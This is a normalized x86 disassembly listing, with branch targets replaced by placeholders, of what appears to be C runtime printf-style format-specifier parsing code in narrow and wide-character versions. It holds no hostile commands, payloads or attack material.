mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_40f3a4
jmp r-xdata
mov ecx esi
call sub_40fcc4
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_40f502
jmp r-xdata
mov ecx esi
call sub_40f553
jmp r-xdata
mov ecx esi
call sub_40f838
test al al
je r-xdata
sub_40f274
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4128e9
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_41056e
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_40f00b
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_40f384 ]
mov ecx esi
call sub_40f43d
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_40f3e1
jmp r-xdata
mov ecx esi
call sub_40fcef
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_40f52a
jmp r-xdata
mov ecx esi
call sub_40f6bc
jmp r-xdata
mov ecx esi
call sub_40fa67
test al al
je r-xdata
sub_40f3a4
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_40f3e1
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_40f45c
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_40f4a1
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_410612
mov al 0x1
pop esi
retn
pop esi
retn
sub_40f4a1
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_410612
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_40f502
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_40f09e
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_40f52a
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_40f0fa
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_40f553
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_40f838
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_40f6bc
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_40fa67
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_40f838
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_410426
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_41040e
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_40fe3d
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_40fd77
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_410231
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_41037b
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_410109
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_4103ef
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4107c6
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_40ec32
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_410694
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_40ec32
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_40ec32
add esp 0x10
sub_40fa67
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_410499
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_41040e
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_40ff97
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_40fdda
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_410231
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_41037b
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_410199
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_4103ef
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_410850
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_40ec5e
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_41073b
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_40ec5e
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_40ec5e
add esp 0x10
sub_40fcc4
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_40f09e
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_40fcef
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_40f0fa
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_40fd1b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xb
ja r-xdata
xor eax eax
pop ebp
retn
jmp [ eax * 4 + jump_table_40fd47 ]
push 0x4
xor eax eax
inc eax
pop ebp
retn
push 0x2
jmp r-xdata
push 0x8
jmp r-xdata
pop eax
pop ebp
retn
sub_40fd77
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_40ea88
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_40fdda
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_40eac8
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_40fe3d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_40ea02
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_40e9ea
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_40e9ea
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_40eb17
push eax
mov ecx edi
call sub_40e9ea
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4158b1
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_40f042
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_40ef82
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_40ff97
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_40ea02
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_40e9ea
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_40e9ea
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_40eb17
push eax
mov ecx edi
call sub_40e9ea
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4158b1
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_40f042
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_40ef82
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_410109
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_40ea88
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_40e9ea
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_414c91
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_410199
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esi + 0x3c ] 0x1
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push [ esi + 0x2c ]
movzx ebx [ eax - 0x4 ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_40eac8
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
jne r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x404 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] al
test ecx ecx
jne r-xdata
mov [ eax ] bx
mov eax edi
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_414a5c
add esp 0x10
test eax eax
jns r-xdata
mov ecx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_410231
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_40fd1b
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
